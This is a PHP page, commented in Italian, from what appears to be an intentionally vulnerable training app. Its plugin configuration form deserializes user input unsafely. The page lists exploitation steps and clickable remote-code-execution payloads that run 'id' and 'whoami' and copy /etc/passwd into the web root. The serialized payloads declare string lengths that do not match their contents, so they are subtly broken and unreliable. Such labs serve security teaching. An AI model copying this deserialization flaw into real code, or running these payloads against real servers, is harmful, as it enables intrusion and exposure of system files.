<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_connect.php';
require_once 'PluginLoader.php';
require_once 'header.php';

$page_title = 'Configura Plugin';

// VULNERABILITÀ CRITICA: Gestione configurazioni con deserializzazione non sicura
// Gli utenti possono modificare configurazioni serializzate che vengono poi deserializzate

$plugin_id = $_GET['id'] ?? null;

if (!$plugin_id) {
    header('Location: plugins.php');
    exit;
}

$stmt = $conn->prepare("SELECT * FROM plugins WHERE id = ?");
$stmt->execute([$plugin_id]);
$plugin = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$plugin) {
    die("Plugin non trovato");
}

// VULNERABILITÀ: Carica e deserializza configurazione senza validazione
$current_config = null;
if (!empty($plugin['config_data'])) {
    // VULNERABILITÀ CRITICA: Deserializza senza verifica
    $current_config = unserialize($plugin['config_data']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
    $config_data = $_POST['config_data'] ?? '';
    
    // VULNERABILITÀ CRITICA: Salva configurazione serializzata senza validazione
    // Un attaccante potrebbe inserire dati serializzati malevoli che verranno eseguiti
    // quando il plugin viene installato o caricato
    
    // VULNERABILITÀ: Non verifica se i dati sono validi prima di salvarli
    $update_stmt = $conn->prepare("UPDATE plugins SET config_data = ? WHERE id = ?");
    $update_stmt->execute([$config_data, $plugin_id]);
    
    // VULNERABILITÀ: Deserializza immediatamente per "testare" (pericoloso!)
    // Questo eseguirà __wakeup() se l'oggetto deserializzato è PluginLoader o PluginConfig
    try {
        // Assicuriamoci che PluginLoader sia caricato
        if (!class_exists('PluginLoader')) {
            require_once 'PluginLoader.php';
        }
        if (!class_exists('PluginConfig')) {
            require_once 'PluginLoader.php';
        }
        
        $test_config = @unserialize($config_data);
        if ($test_config === false && $config_data !== serialize(false)) {
            // Se la deserializzazione fallisce, potrebbe essere un problema di formato
            // Ma continuiamo comunque (vulnerabilità!)
        }
        // Se $test_config è un oggetto, __wakeup() viene chiamato automaticamente
        // Se è PluginLoader con $command impostato, system() verrà eseguito!
        // Nota: __wakeup() viene chiamato DURANTE unserialize(), non dopo!
    } catch (Exception $e) {
        // Ignora errori (vulnerabilità!)
    } catch (Error $e) {
        // Ignora anche errori fatali (vulnerabilità!)
    }
    
    $success = "Configurazione salvata!";
    
    // Ricarica plugin
    $stmt = $conn->prepare("SELECT * FROM plugins WHERE id = ?");
    $stmt->execute([$plugin_id]);
    $plugin = $stmt->fetch(PDO::FETCH_ASSOC);
    
    // VULNERABILITÀ: Deserializza di nuovo (esegue __wakeup() se presente)
    if (!empty($plugin['config_data'])) {
        $current_config = @unserialize($plugin['config_data']);
    }
}
?>

<h1>Configura Plugin: <?php echo htmlspecialchars($plugin['name']); ?></h1>

<?php if (isset($success)): ?>
    <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
    <?php
    // Mostra se ci sono file di esecuzione creati (per verificare che il comando sia stato eseguito)
    $exec_files = glob('/tmp/plugin_exec_*.txt');
    if (!empty($exec_files)) {
        $latest_file = end($exec_files);
        if (file_exists($latest_file)) {
            $output = file_get_contents($latest_file);
            echo '<div class="alert alert-warning" style="margin-top: 10px;">';
            echo '<strong>⚠️ Comando eseguito durante la deserializzazione!</strong><br>';
            echo '<small>File: ' . htmlspecialchars($latest_file) . '</small><br>';
            echo '<pre style="background: #f5f5f5; padding: 10px; margin-top: 5px; border-radius: 4px; max-height: 200px; overflow-y: auto;">' . htmlspecialchars($output) . '</pre>';
            echo '</div>';
        }
    }
    ?>
<?php endif; ?>

<div class="config-form">
    <form method="POST" action="">
        <div class="form-group">
            <label for="config_data">Configurazione (formato serializzato PHP)</label>
            <textarea id="config_data" name="config_data" rows="10" class="code-textarea" required><?php echo htmlspecialchars($plugin['config_data'] ?? ''); ?></textarea>
            <small>⚠️ VULNERABILITÀ CRITICA: I dati vengono deserializzati senza validazione. Puoi inserire oggetti serializzati malevoli!</small>
        </div>
        
        <button type="submit" name="save_config" class="btn">Salva Configurazione</button>
        <a href="plugins.php" class="btn btn-secondary">Annulla</a>
    </form>
</div>

<div class="config-preview" style="margin-top: 30px;">
    <h3>Anteprima Configurazione (deserializzata)</h3>
    <?php if ($current_config): ?>
        <pre style="background: #f5f5f5; padding: 15px; border-radius: 4px; overflow-x: auto;"><?php print_r($current_config); ?></pre>
    <?php else: ?>
        <p>Nessuna configurazione disponibile</p>
    <?php endif; ?>
</div>

<div class="vulnerability-warning" style="margin-top: 30px; padding: 15px; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 4px;">
    <h4>⚠️ VULNERABILITÀ CRITICA - Deserializzazione Non Sicura:</h4>
    <p><strong>Come sfruttare:</strong></p>
    <ol>
        <li>Inserisci un oggetto PluginLoader serializzato con comando arbitrario nel campo sopra</li>
        <li>Clicca su "Salva Configurazione"</li>
        <li>Il comando verrà eseguito IMMEDIATAMENTE durante la deserializzazione!</li>
        <li>L'output del comando verrà mostrato automaticamente nella pagina dopo il salvataggio</li>
    </ol>
    <p><strong>Esempi di payload per RCE:</strong></p>
    <div style="margin-top: 10px;">
        <p><strong>1. Comando base (output in /tmp):</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}</pre>
        
        <p><strong>2. Comando con output accessibile via web:</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}</pre>
        
        <p><strong>3. Leggere file sensibili:</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:35:"cat /etc/passwd > /var/www/html/passwd.txt";}</pre>
        
        <p><small>💡 Clicca su un payload per inserirlo automaticamente nel campo di testo</small></p>
    </div>
    <p><strong>Nota:</strong> Il comando viene eseguito DURANTE la deserializzazione (quando salvi), non quando installi il plugin!</p>
</div>

<?php require_once 'footer.php'; ?>

